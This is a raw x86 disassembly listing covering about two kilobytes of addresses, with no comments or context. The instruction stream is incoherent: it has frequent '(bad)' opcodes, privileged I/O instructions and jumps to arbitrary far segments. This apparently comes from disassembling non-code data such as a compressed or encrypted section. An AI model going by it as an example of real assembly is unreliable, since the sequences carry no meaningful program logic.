  435b1e:	or     edx,DWORD PTR [ecx+0x7c]
  435b21:	mov    cl,0x38
  435b23:	mov    ch,0xa9
  435b25:	adc    BYTE PTR [ebp+esi*1-0x3a4c90e0],dh
  435b2c:	push   edx
  435b2d:	sahf   
  435b2e:	or     dh,BYTE PTR [edi-0x5c80948a]
  435b34:	cmp    edi,DWORD PTR [ecx-0x65]
  435b37:	adc    DWORD PTR [esi-0x6e],esi
  435b3a:	cs or  esp,ebp
  435b3d:	inc    edx
  435b3e:	sub    DWORD PTR [ebp-0x3bed6f63],eax
  435b44:	lahf   
  435b45:	xchg   BYTE PTR [eax+0x9],ch
  435b48:	mov    esi,0x26ace33a
  435b4d:	cmp    ch,BYTE PTR [ebx]
  435b4f:	push   edx
  435b50:	fist   DWORD PTR [ebp+edx*8-0x59]
  435b54:	int3   
  435b55:	cmp    al,0x97
  435b57:	les    ebp,FWORD PTR [edi]
  435b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435b5a:	ss call 0xd25e3b62
  435b60:	push   ds
  435b61:	test   DWORD PTR [edx],esi
  435b63:	pop    ss
  435b64:	mov    dh,0x75
  435b66:	add    ebp,ebx
  435b68:	mov    al,0x54
  435b6a:	cli    
  435b6b:	cwde   
  435b6c:	inc    eax
  435b6d:	cmc    
  435b6e:	sub    bl,ch
  435b70:	mov    al,0xa9
  435b72:	sbb    bl,0x96
  435b75:	(bad)  
  435b76:	pop    ebp
  435b77:	push   ebx
  435b78:	xor    BYTE PTR [ebp+eiz*1+0x3a],cl
  435b7c:	and    BYTE PTR [edx-0x76812c3],bh
  435b82:	jo     0x435b97
  435b84:	out    0xa,eax
  435b86:	loop   0x435b3f
  435b88:	jno    0x435b65
  435b8a:	or     ecx,ebx
  435b8c:	shr    DWORD PTR [edx],1
  435b8e:	cdq    
  435b8f:	call   FWORD PTR [ecx-0x52a810d7]
  435b95:	je     0x435b1a
  435b97:	scas   al,BYTE PTR es:[edi]
  435b98:	mov    dl,BYTE PTR [esp+ebx*2-0x5b]
  435b9c:	mov    dh,0x2c
  435b9e:	add    bl,BYTE PTR [ebx-0x772727d]
  435ba4:	leave  
  435ba5:	xchg   DWORD PTR [ecx+esi*2-0x5c8d7095],ebx
  435bac:	or     ch,BYTE PTR [esi-0x7b]
  435baf:	lods   al,BYTE PTR ds:[esi]
  435bb0:	fldl2t 
  435bb2:	push   ecx
  435bb3:	stos   DWORD PTR es:[edi],eax
  435bb4:	jmp    0x73be:0xb514768a
  435bbb:	rcr    DWORD PTR ds:0xba8a86d3,1
  435bc1:	scas   al,BYTE PTR es:[edi]
  435bc2:	jo     0x435b7f
  435bc4:	xchg   BYTE PTR [eax-0x3bcbffa5],dh
  435bca:	test   DWORD PTR [ebx],ecx
  435bcc:	ins    DWORD PTR es:[edi],dx
  435bcd:	retf   0xa204
  435bd0:	jl     0x435bca
  435bd2:	shr    BYTE PTR [ebp-0xdd3c353],0x52
  435bd9:	add    DWORD PTR [ebp-0x69517ae2],ebp
  435bdf:	mov    BYTE PTR [esi],ah
  435be1:	and    cl,BYTE PTR [eax-0x4bc12298]
  435be7:	fnstsw WORD PTR [edx]
  435be9:	mov    bl,BYTE PTR [esi-0x78]
  435bec:	das    
  435bed:	push   0x1a0d9ede
  435bf2:	and    bl,dl
  435bf4:	adc    BYTE PTR [esi],ch
  435bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435bf7:	cli    
  435bf8:	rcl    BYTE PTR [ebx-0x23afe8be],0x2
  435bff:	ins    BYTE PTR es:[edi],dx
  435c00:	mov    edx,0x9947ac7
  435c05:	test   al,0xed
  435c07:	rcl    BYTE PTR [eax],cl
  435c09:	mov    eax,ds:0xe3834f78
  435c0e:	or     ch,BYTE PTR [eax+0x37]
  435c11:	div    DWORD PTR [eax+esi*4-0x61f80446]
  435c18:	ror    DWORD PTR [edx],1
  435c1a:	and    cl,BYTE PTR [esp+esi*2-0x14a24b00]
  435c21:	jnp    0x435c95
  435c23:	inc    ecx
  435c24:	cmc    
  435c25:	mov    DWORD PTR [edx+0x2d516b68],esp
  435c2b:	aaa    
  435c2c:	and    DWORD PTR [ebx+0x68da2480],ebx
  435c32:	inc    eax
  435c33:	xor    eax,0x9a4b93be
  435c38:	rcl    DWORD PTR [ecx],0xb0
  435c3b:	pop    ebp
  435c3c:	push   eax
  435c3d:	out    dx,al
  435c3e:	xchg   ebp,eax
  435c3f:	mov    bl,0x6f
  435c41:	xor    eax,0x1150d60c
  435c46:	pop    ebx
  435c47:	ds rcr ebp,0xe8
  435c4b:	inc    edi
  435c4c:	push   ecx
  435c4d:	sbb    ebp,DWORD PTR [edx]
  435c4f:	loopne 0x435c4a
  435c51:	mov    al,0x4b
  435c53:	cld    
  435c54:	dec    ebp
  435c55:	mov    bh,0xe
  435c57:	push   0x3
  435c59:	mov    cl,ch
  435c5b:	adc    ecx,DWORD PTR [eax]
  435c5d:	pop    ss
  435c5e:	ret    0x420b
  435c61:	loop   0x435c39
  435c63:	add    DWORD PTR ds:0x28fbe2ef,edx
  435c69:	mov    dh,BYTE PTR [ecx+0x6d88edb0]
  435c6f:	or     bl,BYTE PTR [ecx+0x4a]
  435c72:	out    0x85,al
  435c74:	repnz add eax,DWORD PTR [ebp-0x69]
  435c78:	mov    edi,0x4f008557
  435c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435c7e:	add    BYTE PTR [eax],ch
  435c80:	cmp    al,0xe8
  435c82:	push   eax
  435c83:	popa   
  435c84:	add    DWORD PTR [esi+0x5f3d266a],0x79
  435c8b:	dec    edx
  435c8c:	mov    esp,0xc2b76d76
  435c91:	ins    DWORD PTR es:[edi],dx
  435c92:	in     al,0x71
  435c94:	mov    ds:0x48bc0484,eax
  435c99:	pop    ss
  435c9a:	(bad)  
  435c9b:	jmp    0x435ca7
  435c9d:	pusha  
  435c9e:	inc    edi
  435c9f:	mov    al,0x62
  435ca1:	mov    al,BYTE PTR [edi+eiz*2]
  435ca4:	out    0xd,eax
  435ca6:	inc    eax
  435ca7:	fstp   QWORD PTR [edx]
  435ca9:	mov    ds:0xd2c5924b,eax
  435cae:	push   esp
  435caf:	mov    ah,0x80
  435cb1:	fsubr  DWORD PTR [esi+0xb]
  435cb4:	add    al,0x91
  435cb6:	xor    ch,BYTE PTR [edi+0x6044380b]
  435cbc:	pop    ss
  435cbd:	push   ecx
  435cbe:	ins    BYTE PTR es:[edi],dx
  435cbf:	mov    ah,0x40
  435cc1:	js     0x435d10
  435cc3:	adc    esi,DWORD PTR [eax+0x21a1705]
  435cc9:	lea    esi,[esp+edi*2]
  435ccc:	and    dl,bl
  435cce:	push   ss
  435ccf:	cmp    ch,BYTE PTR [eax-0x25]
  435cd2:	inc    esi
  435cd3:	inc    edi
  435cd4:	jp     0x435cce
  435cd6:	lods   al,BYTE PTR ds:[esi]
  435cd7:	lods   al,BYTE PTR ds:[esi]
  435cd8:	inc    esp
  435cd9:	mov    al,ds:0x11d8856
  435cde:	fcom   QWORD PTR [ebp+0x11c1dcf0]
  435ce4:	cmp    al,0xa5
  435ce6:	test   al,0xdd
  435ce8:	mov    edx,0x5ee3424f
  435ced:	push   ds
  435cee:	sahf   
  435cef:	(bad)  
  435cf0:	fild   DWORD PTR [edi]
  435cf2:	outs   dx,BYTE PTR ds:[esi]
  435cf3:	mov    ch,0x96
  435cf5:	mov    DWORD PTR [edx+edi*8],esi
  435cf8:	jl     0x435d48
  435cfa:	mov    eax,ds:0x5b746e60
  435cff:	pop    ebx
  435d00:	push   edi
  435d01:	add    al,0x85
  435d03:	mov    ebx,0x16eb9986
  435d08:	sub    cl,BYTE PTR [esp+edx*8-0x1b]
  435d0c:	xor    al,BYTE PTR [eax]
  435d0e:	iret   
  435d0f:	mov    ebp,gs
  435d11:	int    0x4d
  435d13:	inc    ecx
  435d14:	fcom   QWORD PTR [esi+0x79e3d3cd]
  435d1a:	dec    DWORD PTR ds:0x21a015ee
  435d20:	mov    al,ds:0x4c4a73d5
  435d25:	lea    esp,[esi+0x1526b8aa]
  435d2b:	ret    0x3225
  435d2e:	js     0x435cd5
  435d30:	test   DWORD PTR [ebp+0x317f5085],eax
  435d36:	(bad)  
  435d37:	imul   BYTE PTR [eax]
  435d39:	mov    edi,0xd4b6e2bc
  435d3e:	mov    dl,bh
  435d40:	(bad)  
  435d41:	mov    ecx,0xa1c1d4f1
  435d46:	inc    esp
  435d47:	jno    0x435db4
  435d49:	mov    ds:0x3ad15302,al
  435d4e:	shr    BYTE PTR [eax+0x2db5b8d],1
  435d54:	fs mov ah,0xc8
  435d57:	or     esi,DWORD PTR ds:0xda9718fb
  435d5d:	mov    dh,0xb6
  435d5f:	add    ebp,DWORD PTR [edx+edx*2]
  435d62:	int3   
  435d63:	ret    0x7ebc
  435d66:	mov    DWORD PTR [edi+0x396e168f],ebx
  435d6c:	int    0x5e
  435d6e:	pushf  
  435d6f:	adc    eax,0x36f76685
  435d74:	add    eax,0x14b1a5d1
  435d79:	fstp   QWORD PTR [ecx]
  435d7b:	in     al,0x52
  435d7d:	hlt    
  435d7e:	lea    ebp,[ebp+0x772b0aa1]
  435d84:	jecxz  0x435d83
  435d86:	push   es
  435d87:	lds    esi,FWORD PTR [esi+0x20ab6dd]
  435d8d:	xor    DWORD PTR [ecx+0x76],0x63
  435d91:	sbb    ch,dh
  435d93:	mov    edi,0xd6d6e022
  435d98:	jbe    0x435d78
  435d9a:	es mov ebp,0x40c8656b
  435da0:	mov    esp,0x9516e020
  435da5:	or     esi,DWORD PTR [ebp+0x4746f2e6]
  435dab:	push   ebp
  435dac:	fwait
  435dad:	xor    BYTE PTR ds:0x5be54073,0x6a
  435db4:	push   ecx
  435db5:	ins    DWORD PTR es:[edi],dx
  435db6:	fmul   DWORD PTR [edx]
  435db8:	cmp    BYTE PTR [ecx+0x35],dl
  435dbb:	int3   
  435dbc:	sbb    eax,0x768da8ad
  435dc1:	push   eax
  435dc2:	ins    DWORD PTR es:[edi],dx
  435dc3:	ret    0x8dff
  435dc6:	(bad)  
  435dc7:	mov    ah,0xaa
  435dc9:	(bad)  
  435dca:	outs   dx,BYTE PTR ds:[esi]
  435dcb:	cmp    BYTE PTR [eax-0x31],ch
  435dce:	int    0x3
  435dd0:	aam    0x61
  435dd2:	sub    BYTE PTR [esi],0x6c
  435dd5:	stc    
  435dd6:	add    DWORD PTR [eax+eiz*8-0x36],esp
  435dda:	push   eax
  435ddb:	test   DWORD PTR [esi-0x73c9bd18],eax
  435de1:	xchg   esp,eax
  435de2:	(bad)  
  435de4:	ins    DWORD PTR es:[di],dx
  435de6:	or     DWORD PTR [ebx-0x7a],0x5e
  435dea:	in     eax,0x83
  435dec:	adc    ecx,ebp
  435dee:	pop    esp
  435def:	je     0x435e20
  435df1:	les    edx,FWORD PTR [edx]
  435df3:	mov    cl,0x6d
  435df5:	sbb    eax,0xb3e5084d
  435dfa:	or     ch,BYTE PTR [esi+0x6d]
  435dfd:	fist   DWORD PTR [eax]
  435dff:	int3   
  435e00:	xchg   esi,eax
  435e01:	dec    ecx
  435e02:	mov    edi,0x1956b306
  435e07:	cli    
  435e08:	rol    BYTE PTR [ebp-0x6bbad7fa],1
  435e0e:	sbb    al,0x78
  435e10:	int    0x6
  435e12:	mov    bl,al
  435e14:	ss sbb bh,ah
  435e17:	ss mov edx,fs
  435e1a:	push   ds
  435e1b:	mov    eax,ds:0xd4a89680
  435e20:	jns    0x435e16
  435e22:	cmp    BYTE PTR [ecx+0x5cab62d1],ah
  435e28:	addr16 clc 
  435e2a:	mov    cl,0x9d
  435e2c:	cs aaa 
  435e2e:	dec    esp
  435e2f:	or     ebp,DWORD PTR [ebp-0x2]
  435e32:	fwait
  435e33:	pop    eax
  435e34:	sub    al,0xb3
  435e36:	dec    eax
  435e37:	mov    eax,0x5d8007
  435e3c:	or     ebp,DWORD PTR [ebx]
  435e3e:	ins    BYTE PTR es:[edi],dx
  435e3f:	shl    ch,1
  435e41:	loope  0x435e17
  435e43:	add    eax,0xf13f0eda
  435e48:	xor    al,0x80
  435e4a:	nop
  435e4b:	mov    ebp,0xd06c2e26
  435e50:	add    esi,ecx
  435e52:	mov    ebp,0xbbe5431d
  435e57:	jge    0x435eb5
  435e59:	call   0xdeaa7486
  435e5e:	mov    bl,0x35
  435e60:	jmp    0x435e99
  435e62:	lock sub ch,BYTE PTR [esi+0x1d]
  435e66:	add    eax,0xad056e4d
  435e6b:	or     eax,0x8e8dd05d
  435e70:	mov    dh,0xe6
  435e72:	push   ecx
  435e73:	push   esp
  435e74:	lock xor eax,0x9add55c4
  435e7a:	mov    dh,BYTE PTR [ebx]
  435e7c:	jbe    0x435e9b
  435e7e:	and    BYTE PTR [esi-0x497df168],ah
  435e84:	or     eax,0x4da7a0c8
  435e89:	ins    DWORD PTR es:[edi],dx
  435e8a:	inc    edi
  435e8b:	sub    al,0x34
  435e8d:	adc    eax,0x670e7fc4
  435e92:	inc    edx
  435e93:	out    dx,al
  435e94:	mov    dh,0x36
  435e96:	push   esp
  435e97:	mov    ch,0x14
  435e99:	mov    BYTE PTR [edx],0x2
  435e9c:	adc    al,0xfb
  435e9e:	inc    ecx
  435e9f:	lds    esp,FWORD PTR [esi]
  435ea1:	or     BYTE PTR [esi+0x26],0x51
  435ea5:	jmp    0x435e29
  435ea7:	pop    edx
  435ea8:	fdivr  DWORD PTR [edx-0x4e4ae405]
  435eae:	push   ss
  435eaf:	inc    edi
  435eb0:	sbb    eax,0x6171b045
  435eb5:	mov    bh,0x7c
  435eb7:	sbb    dh,BYTE PTR [ecx]
  435eb9:	pop    ebp
  435eba:	pushf  
  435ebb:	stos   BYTE PTR es:[edi],al
  435ebc:	and    dh,BYTE PTR cs:[esi]
  435ebf:	mov    al,0xf
  435ec1:	jb     0x435eec
  435ec3:	push   0x1a
  435ec5:	push   ebp
  435ec6:	mov    ebx,0x4b80e9b5
  435ecb:	jns    0x435f02
  435ecd:	inc    eax
  435ece:	jbe    0x435f39
  435ed0:	popa   
  435ed1:	fistp  DWORD PTR ds:0x4c167793
  435ed7:	test   al,0x89
  435ed9:	adc    eax,0x5d155c11
  435ede:	add    DWORD PTR [edi-0x75a441d7],esi
  435ee4:	jp     0x435e68
  435ee6:	pusha  
  435ee7:	inc    ebx
  435ee8:	sub    al,0x16
  435eea:	add    esi,ebx
  435eec:	(bad)  
  435eed:	jno    0x435f25
  435eef:	push   ebp
  435ef0:	mov    ch,0xed
  435ef2:	jecxz  0x435f13
  435ef4:	out    0xd4,al
  435ef6:	cmp    al,0x6
  435ef8:	daa    
  435ef9:	js     0x435f6d
  435efb:	mov    eax,ds:0x6dc6a021
  435f00:	lods   al,BYTE PTR ds:[esi]
  435f01:	or     eax,0x1d40088
  435f06:	mov    bh,0x26
  435f08:	shl    DWORD PTR [ebp+ebp*8+0x4d],0x34
  435f0d:	jbe    0x435f53
  435f0f:	ins    DWORD PTR es:[edi],dx
  435f10:	pop    eax
  435f11:	jge    0x435ee4
  435f13:	cld    
  435f14:	enter  0x170c,0x10
  435f18:	aaa    
  435f19:	pop    esp
  435f1a:	cmp    al,0x30
  435f1c:	dec    ecx
  435f1d:	fwait
  435f1e:	pop    es
  435f1f:	push   esp
  435f20:	ins    BYTE PTR es:[edi],dx
  435f21:	and    BYTE PTR [edx-0x8],ah
  435f24:	jg     0x435ec4
  435f26:	dec    ebp
  435f27:	cmp    ah,al
  435f29:	push   es
  435f2a:	shl    BYTE PTR [esi],1
  435f2c:	inc    ebp
  435f2d:	xchg   ebx,eax
  435f2e:	dec    esi
  435f2f:	add    ah,BYTE PTR [edx-0x5c]
  435f32:	sub    eax,0x445576d1
  435f37:	leave  
  435f38:	loopne 0x435ef9
  435f3a:	pop    esi
  435f3b:	push   ebp
  435f3c:	in     eax,dx
  435f3d:	mov    dl,0xb6
  435f40:	push   eax
  435f41:	(bad)  
  435f43:	or     DWORD PTR [ebx+0x1f83244f],edi
  435f49:	pop    esp
  435f4a:	add    DWORD PTR [edx-0x7cb04ae5],ebp
  435f50:	popa   
  435f51:	pop    ebx
  435f52:	sub    al,0x71
  435f54:	(bad)  
  435f56:	jbe    0x435f01
  435f58:	push   0xb9f64405
  435f5d:	cdq    
  435f5e:	imul   edi,DWORD PTR [ebp+0x73],0x8
  435f62:	outs   dx,BYTE PTR ds:[esi]
  435f63:	sbb    eax,0xdb4e6c15
  435f68:	jns    0x435fa5
  435f6a:	cmc    
  435f6b:	(bad)
  435f6e:	add    al,0xb5
  435f70:	mov    edi,DWORD PTR [ecx+0x58bf529b]
  435f76:	mov    ds:0x26c155,eax
  435f7b:	sub    eax,0xffffffac
  435f7e:	push   0x1135baa2
  435f83:	in     al,dx
  435f84:	stos   BYTE PTR es:[edi],al
  435f85:	jne    0x435f2a
  435f87:	fist   DWORD PTR [ebx+0x1812adc0]
  435f8d:	js     0x435fac
  435f8f:	hlt    
  435f90:	dec    esp
  435f91:	test   DWORD PTR [eax-0x46],ebx
  435f94:	xor    eax,0x598e7101
  435f99:	repnz bswap eax
  435f9c:	repz inc edi
  435f9e:	add    DWORD PTR [ebx],ebx
  435fa0:	and    bl,ah
  435fa2:	mov    edx,0xec14c255
  435fa7:	and    BYTE PTR [eax-0x60],0x58
  435fab:	shl    DWORD PTR [eax],0xf9
  435fae:	inc    ecx
  435faf:	mov    ebx,0x888ad8aa
  435fb4:	test   eax,0x5a0e640f
  435fb9:	inc    ecx
  435fba:	fist   DWORD PTR ds:0x26cdbd6f
  435fc0:	sub    DWORD PTR [eax-0x3b49fe9e],ebp
  435fc6:	je     0x435f62
  435fc8:	sub    esp,edx
  435fca:	push   ecx
  435fcb:	mov    al,0x6d
  435fcd:	xchg   esi,eax
  435fce:	or     al,0x42
  435fd0:	or     BYTE PTR [edi],0xdb
  435fd3:	loop   0x435fa5
  435fd5:	mov    es,WORD PTR [eax-0x9e3ce92]
  435fdb:	stc    
  435fdc:	add    eax,0x1ad5e
  435fe1:	jbe    0x435f7d
  435fe3:	in     al,dx
  435fe4:	or     esi,DWORD PTR [edx-0x25fde825]
  435fea:	sub    BYTE PTR [ebp+0x2252e251],0xe4
  435ff1:	cmp    eax,0x86ea5a5d
  435ff6:	and    al,0x26
  435ff8:	jle    0x436059
  435ffa:	sub    esp,DWORD PTR [ebx+0x1d]
  435ffd:	shr    BYTE PTR [ebp+0x11b6e081],0x9f
  436004:	xchg   ebp,eax
  436005:	add    DWORD PTR [ebx-0x56],ecx
  436008:	retf   
  436009:	gs inc esp
  43600b:	jne    0x435fe8
  43600d:	ficom  DWORD PTR [ebp-0x11]
  436010:	je     0x436068
  436012:	fisttp DWORD PTR [eax]
  436014:	loope  0x43607c
  436016:	xor    eax,0x10343441
  43601b:	push   ebx
  43601c:	xor    DWORD PTR [ebp-0x2491270c],eax
  436022:	mov    dh,0xb1
  436024:	xor    eax,0xef144898
  436029:	stc    
  43602a:	fidivr DWORD PTR [ebx+ecx*1-0x7a]
  43602e:	out    0xaa,eax
  436030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436031:	mov    dl,BYTE PTR es:[esp+edi*2-0x38]
  436036:	int3   
  436037:	inc    esp
  436038:	in     eax,dx
  436039:	mov    ds:0x7f22dfd8,al
  43603e:	lds    esp,FWORD PTR [edi+0x5da206da]
  436044:	add    DWORD PTR [edx],eax
  436046:	jns    0x435ff3
  436048:	rcr    BYTE PTR [eax-0x5d595d5f],0x15
  43604f:	aaa    
  436050:	mov    bh,0x58
  436052:	sbb    BYTE PTR [ecx],dl
  436054:	je     0x4360d1
  436056:	mov    dl,ah
  436058:	sti    
  436059:	jecxz  0x436013
  43605b:	mov    al,0xa
  43605d:	call   0x983e:0x6c69d8a8
  436064:	call   0x7260:0x5ad96206
  43606b:	or     eax,0x5a4fea5f
  436070:	mov    edx,0x3399c4f0
  436075:	icebp  
  436076:	cmp    BYTE PTR [edi-0x45],ah
  436079:	jnp    0x4360b0
  43607b:	adc    eax,0x80eb76c5
  436080:	in     eax,dx
  436081:	push   es
  436082:	jge    0x43608b
  436084:	sbb    eax,DWORD PTR [edi-0x29]
  436087:	and    bh,BYTE PTR [edx-0x72e3fb30]
  43608d:	aaa    
  43608e:	xor    BYTE PTR [edi],0x5d
  436091:	rol    DWORD PTR [ebp+0x6722240e],1
  436097:	xchg   ebx,eax
  436098:	fistp  WORD PTR [ebx-0x4c]
  43609b:	push   0xce6c2e28
  4360a0:	out    dx,al
  4360a1:	test   eax,0xa6635cb1
  4360a6:	push   esp
  4360a7:	sub    al,0xb4
  4360a9:	or     eax,0xcaece996
  4360ae:	lods   al,BYTE PTR ds:[esi]
  4360af:	call   0x325821f6
  4360b4:	popf   
  4360b5:	or     eax,0xab6178d2
  4360ba:	ins    DWORD PTR es:[edi],dx
  4360bb:	or     BYTE PTR [ebp-0x22],ch
  4360be:	mov    bl,0x65
  4360c0:	in     eax,0x9c
  4360c2:	xchg   esp,eax
  4360c3:	jbe    0x43612e
  4360c5:	imul   esp,DWORD PTR [ebx-0x5f],0xc453fd2a
  4360cc:	ret    0xd2e
  4360cf:	mov    al,0x8a
  4360d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4360d2:	or     eax,0x621bffc5
  4360d7:	shr    DWORD PTR [edi+ecx*8],cl
  4360da:	mov    cl,0x5d
  4360dc:	call   0xd3c3f061
  4360e1:	inc    edi
  4360e2:	cmp    DWORD PTR [eax],ecx
  4360e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360e5:	pusha  
  4360e6:	mov    ebx,0x31e01535
  4360eb:	stos   BYTE PTR es:[edi],al
  4360ec:	xor    cl,BYTE PTR [edi+ebp*8]
  4360ef:	xor    ch,ch
  4360f1:	out    0x6a,al
  4360f3:	cmp    esp,DWORD PTR [eax+0x1d]
  4360f6:	into   
  4360f7:	pop    edi
  4360f8:	(bad)  
  4360f9:	jno    0x436157
  4360fb:	ret    
  4360fc:	xchg   edx,eax
  4360fd:	cs sub al,0x6c
  436100:	ins    BYTE PTR es:[edi],dx
  436101:	add    eax,0x7c6b5de5
  436106:	nop
  436107:	or     eax,0xdb741697
  43610c:	sbb    ah,BYTE PTR [edx-0x6aee48d0]
  436112:	outs   dx,BYTE PTR ds:[esi]
  436113:	add    eax,0xdb6021a5
  436118:	adc    eax,0xf58051a9
  43611d:	sub    ebx,DWORD PTR [edi-0x4ed48bbc]
  436123:	pop    esi
  436124:	clc    
  436125:	or     dl,BYTE PTR [edx+edx*2]
  436128:	jbe    0x4360e0
  43612a:	or     DWORD PTR [eax-0x44a9d8e3],esp
  436130:	ss push cs
  436132:	jl     0x43619f
  436134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436135:	stos   BYTE PTR es:[edi],al
  436136:	pop    ebp
  436137:	aam    0xb1
  436139:	daa    
  43613a:	inc    esi
  43613b:	(bad)  
  43613c:	sahf   
  43613d:	cs sub eax,0x7342aa34
  436143:	xor    al,0x62
  436146:	jmp    0x32a8:0x1b47e202
  43614d:	adc    BYTE PTR [edx-0x2a],dh
  436150:	adc    bh,BYTE PTR [edx+0x229b0140]
  436156:	cmp    edi,DWORD PTR [ecx]
  436158:	mov    ebx,0xd404a969
  43615d:	idiv   DWORD PTR [edx-0x191f25e2]
  436163:	adc    ch,al
  436165:	lods   eax,DWORD PTR ds:[esi]
  436166:	jne    0x4360eb
  436168:	bound  eax,QWORD PTR [ecx]
  43616a:	jecxz  0x43612c
  43616c:	loope  0x436124
  43616e:	add    DWORD PTR [edx],ebp
  436170:	jbe    0x436163
  436172:	dec    ebx
  436173:	mov    dh,0xa2
  436175:	push   0x3606bec
  43617a:	push   ebp
  43617b:	mov    bh,0xfb
  43617d:	xchg   ebp,eax
  43617e:	call   FWORD PTR [ecx-0x6917d522]
  436184:	test   eax,0xc851e0a9
  436189:	test   esi,eax
  43618b:	add    dl,BYTE PTR ds:0x83a1adb7
  436191:	pop    edx
  436192:	sbb    ecx,0x7d
  436195:	mov    bh,0x70
  436197:	adc    BYTE PTR [ebx],bl
  436199:	mov    al,0x75
  43619b:	cmp    al,0xd5
  43619d:	mov    esp,0xf74b6c
  4361a2:	sub    eax,0x2e9f0d11
  4361a7:	lods   eax,DWORD PTR gs:[esi]
  4361a9:	mov    eax,0x98342db4
  4361ae:	add    al,0xd3
  4361b0:	data16 repnz add al,0x6b
  4361b4:	call   0x1baecf26
  4361b9:	mov    ch,BYTE PTR [ebx]
  4361bb:	mov    ds:0xb368cbd7,al
  4361c0:	sub    DWORD PTR [edx],esp
  4361c2:	push   cs
  4361c3:	(bad)  
  4361c5:	sub    al,0x68
  4361c7:	mov    bl,0x2c
  4361c9:	(bad)  
  4361ca:	inc    edx
  4361cb:	pop    ebp
  4361cc:	fiadd  DWORD PTR [ebp+0x0]
  4361cf:	pop    ss
  4361d0:	pop    ecx
  4361d1:	popa   
  4361d2:	in     al,0x95
  4361d4:	and    DWORD PTR [edx+0x1],ebp
  4361d7:	fld    TBYTE PTR [ebp+0x292214a1]
  4361dd:	push   ds
  4361de:	mov    WORD PTR [edi],ss
  4361e0:	cdq    
  4361e1:	in     al,dx
  4361e2:	and    BYTE PTR [eax+0x57],ch
  4361e5:	add    BYTE PTR [esi],bl
  4361e7:	push   ebx
  4361e8:	pop    esp
  4361e9:	stc    
  4361ea:	mov    al,ds:0x2dad85d1
  4361ef:	test   eax,0x4e65d45d
  4361f4:	mov    ebx,0x969fcaf4
  4361f9:	jbe    0x43620f
  4361fb:	aam    0x37
  4361fd:	mov    ch,0x47
  4361ff:	(bad)  
  436201:	ja     0x4361d0
  436203:	mov    bl,BYTE PTR [ebx+0x53]
  436206:	add    DWORD PTR [ecx-0x44],edi
  436209:	cwde   
  43620a:	mov    esp,?
  43620c:	test   al,0x1d
  43620e:	mov    ch,0x23
  436210:	out    dx,al
  436211:	pusha  
  436212:	adc    BYTE PTR [edi],bh
  436214:	or     al,0x80
  436216:	or     dl,BYTE PTR [eax+0x23]
  436219:	mov    edx,0x8ca1e9a2
  43621e:	pop    eax
  43621f:	sub    bl,dl
  436221:	or     DWORD PTR ss:[ebx],edi
  436224:	add    BYTE PTR [ecx+esi*4+0x50035b22],0x3f
  43622c:	dec    edx
  43622d:	fst    QWORD PTR [edx+0x13e92b3f]
  436233:	mov    al,ds:0x3aa2a2ea
  436238:	mov    ebp,0x8226b689
  43623d:	pop    edx
  43623e:	ja     0x436244
  436240:	add    esp,esp
  436242:	and    ebx,DWORD PTR [edx]
  436244:	inc    ecx
  436245:	inc    esp
  436246:	or     esi,DWORD PTR [edi]
  436248:	dec    esi
  436249:	jg     0x436262
  43624b:	or     eax,0xdb88aadd
  436250:	(bad)  
  436251:	cdq    
  436252:	pop    ebx
  436253:	inc    edi
  436254:	shl    BYTE PTR [ebp+0x3b],1
  436257:	pop    ecx
  436258:	push   eax
  436259:	pop    eax
  43625a:	sub    dl,ch
  43625c:	clc    
  43625d:	mov    ?,ebp
  43625f:	(bad)  
  436260:	push   0x6d
  436262:	mov    al,ds:0xb93db4b8
  436267:	out    dx,eax
  436268:	(bad)  
  43626a:	pop    ds
  43626b:	mov    sp,0x823a
  43626f:	dec    ebp
  436270:	inc    ebp
  436271:	cli    
  436272:	and    eax,0x5685e6a
  436277:	fild   DWORD PTR [edx-0x5f]
  43627a:	inc    eax
  43627b:	pop    es
  43627c:	test   DWORD PTR [ecx+0x1e],0x4f6e208
  436283:	xchg   edx,eax
  436284:	mov    ebx,0x59110205
  436289:	push   0xf222badc
  43628e:	xchg   BYTE PTR [ebp-0x4c],dh
  436291:	jne    0x43622a
  436293:	jle    0x43630b
  436295:	adc    BYTE PTR [eax+0x61],dh
  436298:	cmp    al,0xd
  43629a:	arpl   WORD PTR [ebx],bx
  43629c:	leave  
  43629d:	adc    DWORD PTR [edx+0x22a6c411],ebx
  4362a3:	push   esi
  4362a4:	clc    
  4362a5:	dec    eax
  4362a6:	inc    ebp
  4362a7:	in     al,dx
  4362a8:	sbb    al,0x4d
  4362ab:	jno    0x436324
  4362ad:	and    DWORD PTR [edx+0x627b70ae],edx
  4362b3:	inc    edi
  4362b4:	loop   0x4362b2
  4362b6:	lds    esi,FWORD PTR [eax-0x53]
  4362b9:	aam    0x8d
  4362bb:	std    
  4362bc:	fiadd  DWORD PTR [ecx-0x2b]
  4362bf:	lods   eax,DWORD PTR ds:[esi]
  4362c0:	mov    esi,0xa49a524a
  4362c5:	dec    ecx
  4362c6:	mov    esi,0xd000ad82
  4362cb:	and    ch,BYTE PTR [di+0x17bf]
  4362d0:	cmp    al,BYTE PTR [eax+0x259e95b6]
  4362d6:	cs xor al,0x6b
  4362d9:	outs   dx,DWORD PTR ds:[esi]
  4362da:	test   DWORD PTR [ebp-0x3d32eb38],esp
  4362e0:	iret   
  4362e1:	les    esi,FWORD PTR [esi-0x2548fba3]
  4362e7:	pop    ss
  4362e8:	dec    ebx
  4362e9:	imul   ecx,DWORD PTR [ebx+eiz*8+0x446fda37],0x42826db
  4362f4:	pop    eax
  4362f5:	pop    esp
  4362f6:	sbb    ch,BYTE PTR [edi+0x6c]
  4362f9:	mov    al,ds:0xff784362
  4362fe:	dec    ebp
  4362ff:	pop    esi
  436300:	xor    edx,DWORD PTR [eax]
  436302:	or     BYTE PTR [esi],ch
  436304:	je     0x436346
  436306:	push   cs
  436307:	cmp    DWORD PTR [edx],edi
  436309:	jb     0x43631a
  43630b:	add    al,0xcb
  43630d:	mov    dh,0x83
  43630f:	repnz or eax,0xdafb8c4d
  436315:	lds    ebp,FWORD PTR [esi+0x27034d80]
  43631b:	jg     0x43631c
  43631d:	mov    ds:0x15b140bf,eax
  436322:	sbb    eax,0xe5090f6b
  436327:	ins    DWORD PTR es:[edi],dx
